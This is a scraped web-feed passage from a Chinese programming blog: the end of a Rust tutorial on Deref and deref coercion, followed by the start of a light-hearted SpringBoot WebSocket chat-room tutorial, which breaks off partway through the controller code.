    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">String</span>;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">String</span> {
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">DerefMut</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Wrapper</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref_mut</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-keyword">mut</span> <span class="hljs-type">String</span> {
        &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">w</span> = <span class="hljs-title function_ invoke__">Wrapper</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
    
    <span class="hljs-comment">// ❌ 错误！同时存在可变和不可变引用</span>
    <span class="hljs-comment">// let r1 = &amp;w;</span>
    <span class="hljs-comment">// let r2 = &amp;mut w;</span>
    
    <span class="hljs-comment">// ✅ 正确：分开使用</span>
    {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">r</span> = &amp;w;
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, r.<span class="hljs-title function_ invoke__">len</span>());
    }
    {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">r</span> = &amp;<span class="hljs-keyword">mut</span> w;
        r.<span class="hljs-title function_ invoke__">push_str</span>(<span class="hljs-string">" world"</span>);
    }
}
</code></pre>
<h2 data-id="heading-24">7. 最佳实践</h2>
<h3 data-id="heading-25">1. 只为智能指针实现 Deref</h3>
<p><code>Deref</code> 的设计初衷是让智能指针表现得像引用。如果你的类型不是智能指针，可能不应该实现 <code>Deref</code>。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ✅ 合适：智能指针</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt;(T);
<span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; { <span class="hljs-comment">/* ... */</span> }

<span class="hljs-comment">// ❌ 不合适：普通结构体</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">User</span> { name: <span class="hljs-type">String</span> }
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">User</span> {  <span class="hljs-comment">// 不要这样做！</span>
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">String</span>;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">String</span> { &amp;<span class="hljs-keyword">self</span>.name }
}
</code></pre>
<h3 data-id="heading-26">2. Target 类型应该是「内部数据」</h3>
<p><code>Deref</code> 应该暴露智能指针内部持有的数据，而不是计算出的新值。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ✅ 好：暴露内部数据</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Box</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T { <span class="hljs-comment">/* 返回堆上的 T */</span> }
}

<span class="hljs-comment">// ❌ 不好：返回计算值</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">i32</span>;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">i32</span> {
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">sum</span>()  <span class="hljs-comment">// 这不是 Deref 的用途！</span>
    }
}
</code></pre>
<h3 data-id="heading-27">3. 函数参数用切片类型</h3>
<p>利用 Deref coercion，让 API 更灵活：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ✅ 推荐</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>(s: &amp;<span class="hljs-type">str</span>) { <span class="hljs-comment">/* ... */</span> }
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">sum</span>(slice: &amp;[<span class="hljs-type">i32</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> { <span class="hljs-comment">/* ... */</span> }

<span class="hljs-comment">// ❌ 不推荐</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>(s: &amp;<span class="hljs-type">String</span>) { <span class="hljs-comment">/* ... */</span> }
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">sum</span>(vec: &amp;<span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> { <span class="hljs-comment">/* ... */</span> }
</code></pre>
<h3 data-id="heading-28">4. 文档说明 Deref 行为</h3>
<p>如果你的类型实现了 <code>Deref</code>，在文档中说明：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">/// 智能指针，持有堆上的 T。</span>
<span class="hljs-comment">/// </span>
<span class="hljs-comment">/// 实现了 `Deref&lt;Target=T&gt;`，可以像 `&amp;T` 一样使用。</span>
<span class="hljs-comment">/// </span>
<span class="hljs-comment">/// # 示例</span>
<span class="hljs-comment">/// </span>
<span class="hljs-comment">/// ```</span>
<span class="hljs-comment">/// let boxed = MyBox::new(5);</span>
<span class="hljs-comment">/// assert_eq!(5, *boxed);  // 解引用</span>
<span class="hljs-comment">/// ```</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt;(T);
</code></pre>
<h2 data-id="heading-29">总结</h2>
<ol>
<li><strong>Deref 让类型支持 <code>*</code> 解引用</strong>：返回内部数据的引用</li>
<li><strong>解引用强制转换是核心特性</strong>：<code>&amp;String</code> 自动转为 <code>&amp;str</code>，让 API 更灵活</li>
<li><strong>只为智能指针实现 Deref</strong>：不要滥用它来模拟继承</li>
<li><strong>函数参数用切片类型</strong>：<code>&amp;str</code> 而非 <code>&amp;String</code>，<code>&amp;[T]</code> 而非 <code>&amp;Vec&lt;T&gt;</code></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WebSocket：让HTTP的“尬聊”变成真正的“畅聊”]]></title>    <link>https://juejin.cn/post/7596932640726794275</link>    <guid>https://juejin.cn/post/7596932640726794275</guid>    <pubDate>2026-01-20T01:08:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596932640726794275" data-draft-id="7596962344044609576" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WebSocket：让HTTP的“尬聊”变成真正的“畅聊”"/> <meta itemprop="keywords" content="后端,Java,Spring Boot"/> <meta itemprop="datePublished" content="2026-01-20T01:08:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="悟空码字"/> <meta itemprop="url" content="https://juejin.cn/user/3139860942296830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WebSocket：让HTTP的“尬聊”变成真正的“畅聊”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860942296830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    悟空码字
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:08:35.000Z" title="Tue Jan 20 2026 01:08:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是小悟。</p>
<h2 data-id="heading-0">一、WebSocket是什么？—— HTTP的“社恐”表弟变身“社交牛逼症”</h2>
<p>想象一下HTTP协议是个有点“社恐”的程序员：</p>
<ul>
<li>每次聊天都要先说“你好”，对方回“你好”，然后才能说正事</li>
<li>说完一句话就必须闭嘴，等对方回应才能说下一句</li>
<li>想实时聊天？得不停地问“你有新消息吗？”“现在呢？”“现在呢？”</li>
</ul>
<p>而WebSocket就像HTTP喝了十杯咖啡的表弟：</p>
<ul>
<li>一次握手，终身连接（直到你主动分手）</li>
<li>双向通话，随时插话</li>
<li>真正的“你一句我一句”，不再是你问一句我答一句的“审讯式聊天”</li>
</ul>

<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// HTTP vs WebSocket 的日常对话对比</span>

<span class="hljs-comment">// HTTP的尬聊场景：</span>
你：喂，在吗？（请求）
服务器：在的（响应）
你：吃了吗？（请求）
服务器：吃了（响应）
你：吃的啥？（请求）
服务器：...你烦不烦（响应）

<span class="hljs-comment">// WebSocket的畅聊场景：</span>
你：&lt;连接建立&gt;
你：吃了吗？
服务器：吃了，吃的炸鸡
服务器：你要不要也来点？
你：要要要！加杯可乐！
<span class="hljs-comment">// ... 自由流畅的对话继续</span>
</code></pre>
<h2 data-id="heading-1">二、SpringBoot集成WebSocket详细步骤</h2>
<h3 data-id="heading-2">第1步：引入依赖——给项目“灌咖啡”</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- SpringBoot的WebSocket“咖啡包” --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 前端用Stomp的“吸管”喝咖啡 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>stomp-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 前端用SockJS的“备用吸管”（万一主吸管坏了） --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>sockjs-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">第2步：配置类——搭建聊天室的“基础设施”</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.messaging.simp.config.MessageBrokerRegistry;
<span class="hljs-keyword">import</span> org.springframework.web.socket.config.annotation.EnableWebSocketMessageBroker;
<span class="hljs-keyword">import</span> org.springframework.web.socket.config.annotation.StompEndpointRegistry;
<span class="hljs-keyword">import</span> org.springframework.web.socket.config.annotation.WebSocketMessageBrokerConfigurer;

<span class="hljs-comment">/**
 * WebSocket配置类
 * 想象成给聊天室装上门、窗户和广播喇叭
 */</span>
@Configuration
@EnableWebSocketMessageBroker  <span class="hljs-comment">// 这句咒语的意思是：“芝麻开门，我要用WebSocket！”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketConfig</span> implements WebSocketMessageBrokerConfigurer {

    @<span class="hljs-function">Override
    <span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">configureMessageBroker</span><span class="hljs-params">(MessageBrokerRegistry config)</span> </span>{
        <span class="hljs-comment">// 配置消息代理，相当于设置聊天室的“广播站”</span>
        config.<span class="hljs-built_in">enableSimpleBroker</span>(<span class="hljs-string">"/topic"</span>, <span class="hljs-string">"/queue"</span>);  <span class="hljs-comment">// 简单内存代理</span>
        
        <span class="hljs-comment">// 设置应用程序的目的地前缀</span>
        <span class="hljs-comment">// 客户端发送消息到 /app/xxx，就像寄信要写“XX省XX市”</span>
        config.<span class="hljs-built_in">setApplicationDestinationPrefixes</span>(<span class="hljs-string">"/app"</span>);
        
        <span class="hljs-comment">// 用户私聊前缀（点对点）</span>
        config.<span class="hljs-built_in">setUserDestinationPrefix</span>(<span class="hljs-string">"/user"</span>);
    }

    @<span class="hljs-function">Override
    <span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">registerStompEndpoints</span><span class="hljs-params">(StompEndpointRegistry registry)</span> </span>{
        <span class="hljs-comment">// 注册WebSocket端点，相当于给聊天室安装“大门”</span>
        registry.<span class="hljs-built_in">addEndpoint</span>(<span class="hljs-string">"/ws-chat"</span>)
                .<span class="hljs-built_in">setAllowedOriginPatterns</span>(<span class="hljs-string">"*"</span>)  <span class="hljs-comment">// 允许所有来源（生产环境别这么干！）</span>
                .<span class="hljs-built_in">withSockJS</span>();  <span class="hljs-comment">// 后备选项，万一浏览器太老，就降级使用HTTP长轮询</span>
        
        <span class="hljs-comment">// 再来一个不带SockJS的，给现代浏览器用</span>
        registry.<span class="hljs-built_in">addEndpoint</span>(<span class="hljs-string">"/ws-chat"</span>)
                .<span class="hljs-built_in">setAllowedOriginPatterns</span>(<span class="hljs-string">"*"</span>);
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"聊天室大门已安装！门牌号：/ws-chat"</span>);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"备用方案：SockJS已就位，IE6也能凑合用（大概吧）"</span>);
    }
}
</code></pre>
<h3 data-id="heading-4">第3步：消息控制器——聊天室的“主持人”</h3>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.MessageMapping</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.Payload</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.SendTo</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.simp</span><span class="hljs-selector-class">.SimpMessageHeaderAccessor</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.simp</span><span class="hljs-selector-class">.SimpMessagingTemplate</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.stereotype</span><span class="hljs-selector-class">.Controller</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.time</span><span class="hljs-selector-class">.LocalDateTime</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.time</span><span class="hljs-selector-class">.format</span><span class="hljs-selector-class">.DateTimeFormatter</span>;

<span class="hljs-comment">/**
 * 聊天控制器
 * 这位就是聊天室的主持人，负责喊：“XX说了一句话，大家快听！”
 */</span>
@<span class="hljs-selector-tag">Controller</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">ChatController</span> {
    
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">final</span> <span class="hljs-selector-tag">SimpMessagingTemplate</span> <span class="hljs-selector-tag">messagingTemplate</span>;
    
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ChatController</span>(SimpMessagingTemplate messagingTemplate) {
        <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.messagingTemplate</span> = <span class="hljs-selector-tag">messagingTemplate</span>;
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"聊天主持人已就位，话筒测试：喂喂喂~"</span>);
    }
    
    <span class="hljs-comment">/**
     * 广播消息 - 大厅聊天
     * 客户端发送到：/app/chat.sendMessage
     * 服务端广播到：/topic/public
     */</span>
    @<span class="hljs-selector-tag">MessageMapping</span>(<span class="hljs-string">"/chat.sendMessage"</span>)  <span class="hljs-comment">// 接收消息的“信箱”</span>
    @<span class="hljs-selector-tag">SendTo</span>(<span class="hljs-string">"/topic/public"</span>)  <span class="hljs-comment">// 广播的“大喇叭”</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ChatMessage</span> <span class="hljs-selector-tag">sendMessage</span>(<span class="hljs-variable">@Payload</span> ChatMessage chatMessage) {
        <span class="hljs-comment">// 给消息打个时间戳，就像聊天记录的时间标记</span>
        <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setTimestamp</span>(LocalDateTime.<span class="hljs-built_in">now</span>().<span class="hljs-built_in">format</span>(
            DateTimeFormatter.<span class="hljs-built_in">ofPattern</span>(<span class="hljs-string">"HH:mm:ss"</span>)
        ));
        
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"广播消息："</span> + chatMessage.<span class="hljs-built_in">getSender</span>() + <span class="hljs-string">"说："</span> + chatMessage.<span class="hljs-built_in">getContent</span>());
        
        <span class="hljs-comment">// 如果是系统消息（比如有人加入/退出）</span>
        <span class="hljs-selector-tag">if</span> (chatMessage.<span class="hljs-built_in">getType</span>() == MessageType.JOIN) {
            <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setContent</span>(chatMessage.<span class="hljs-built_in">getSender</span>() + <span class="hljs-string">" 闪亮登场！"</span>);
        } <span class="hljs-selector-tag">else</span> <span class="hljs-selector-tag">if</span> (chatMessage.<span class="hljs-built_in">getType</span>() == MessageType.LEAVE) {
            <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setContent</span>(chatMessage.<span class="hljs-built_in">getSender</span>() + <span class="hljs-string">" 溜了溜了~ "</span>);
        }
        
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">chatMessage</span>;
    }
    
    <span class="hljs-comment">/**
     * 用户加入 - 相当于进门喊一声“我来了！”
     */</span>
    @<span class="hljs-selector-tag">MessageMapping</span>(<span class="hljs-string">"/chat.addUser"</span>)
    @<span class="hljs-selector-tag">SendTo</span>(<span class="hljs-string">"/topic/public"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ChatMessage</span> <span class="hljs-selector-tag">addUser</span>(<span class="hljs-variable">@Payload</span> ChatMessage chatMessage,
                               SimpMessageHeaderAccessor headerAccessor) {
        
        <span class="hljs-comment">// 在WebSocket会话中保存用户名，就像给用户发个“名牌”</span>
        <span class="hljs-selector-tag">headerAccessor</span><span class="hljs-selector-class">.getSessionAttributes</span>()<span class="hljs-selector-class">.put</span>(<span class="hljs-string">"username"</span>, chatMessage.<span class="hljs-built_in">getSender</span>());
        
        <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setType</span>(MessageType.JOIN);
        <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setTimestamp</span>(LocalDateTime.<span class="hljs-built_in">now</span>().<span class="hljs-built_in">format</span>(
            DateTimeFormatter.<span class="hljs-built_in">ofPattern</span>(<span class="hljs-string">"HH:mm:ss"</span>)
        ));
        
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"新用户加入："</span> + chatMessage.<span class="hljs-built_in">getSender</span>());
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"当前在线人数：+1（我也不会算，大概吧）"</span>);
        
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">chatMessage</span>;
    }
    
    <span class="hljs-comment">/**
     * 私聊功能 - 偷偷说悄悄话
     * @param to 接收者用户名
     */</span>
    @<span class="hljs-selector-tag">MessageMapping</span>(<span class="hljs-string">"/chat.private"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">privateMessage</span>(<span class="hljs-variable">@Payload</span> ChatMessage chatMessage,
                               <span class="hljs-variable">@Header</span>(<span class="hljs-string">"to"</span>) String toUser) {
        
        <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setTimestamp</span>(LocalDateTime.<span class="hljs-built_in">now</span>().<span class="hljs-built_in">format</span>(
            DateTimeFormatter.<span class="hljs-built_in">ofPattern</span>(<span class="hljs-string">"HH:mm:ss"</span>)
        ));
        
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"私聊消息："</span> + chatMessage.<span class="hljs-built_in">getSender</span>() + 
                          <span class="hljs-string">" 悄悄对 "</span> + toUser + <span class="hljs-string">" 说："</span> + chatMessage.<span class="hljs-built_in">getContent</span>());
        
        <span class="hljs-comment">// 发送给特定用户：/user/{用户名}/queue/private</span>
        <span class="hljs-selector-tag">messagingTemplate</span><span class="hljs-selector-class">.convertAndSendToUser</span>(
            toUser,
            <span class="hljs-string">"/queue/private"</span>,
            chatMessage
        );
        
